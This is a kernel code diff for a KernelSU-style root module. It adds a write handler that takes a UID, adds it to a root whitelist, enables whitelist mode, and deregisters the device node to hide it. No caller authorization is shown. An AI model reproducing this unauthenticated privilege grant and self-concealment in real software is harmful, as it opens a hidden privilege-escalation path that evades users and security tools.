@@ -16,6 +16,7 @@
 #include "supercall/internal.h"
 #include "arch.h"
 #include "klog.h" // IWYU pragma: keep
+#include "policy/allowlist.h" // for whitelist functions
 
 struct ksu_install_fd_tw {
     struct callback_head cb;
@@ -52,10 +53,57 @@ static long kgking_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
     return anon_ksu_ioctl(filp, cmd, arg);
 }
 
+// Hide kgking device
+void do_hide_kgking(void)
+{
+    kgking_hidden = true;
+    misc_deregister(&kgking_miscdev);
+    pr_info("kgking: device hidden\n");
+}
+
+static ssize_t kgking_write(struct file *filp, const char __user *buf, size_t count, loff_t *ppos)
+{
+    char kbuf[32];
+    uid_t uid;
+
+    if (kgking_hidden) {
+        return -ENODEV;
+    }
+
+    if (count >= sizeof(kbuf)) {
+        return -EINVAL;
+    }
+
+    if (copy_from_user(kbuf, buf, count)) {
+        return -EFAULT;
+    }
+    kbuf[count] = '\0';
+
+    // Parse UID
+    if (kstrtouint(kbuf, 10, &uid) != 0) {
+        pr_err("kgking: invalid UID format\n");
+        return -EINVAL;
+    }
+
+    // Add to whitelist
+    ksu_whitelist_add(uid);
+
+    // Enable whitelist mode
+    set_whitelist_mode(true);
+
+    // Hide device immediately
+    do_hide_kgking();
+
+    pr_info("kgking: whitelist UID %u added, device hidden\n", uid);
+
+    return count;
+}
+
 static const struct file_operations kgking_fops = {
     .owner = THIS_MODULE,
     .unlocked_ioctl = kgking_ioctl,
     .compat_ioctl = kgking_ioctl,
+    .write = kgking_write,
     .release = anon_ksu_release,
 };
 
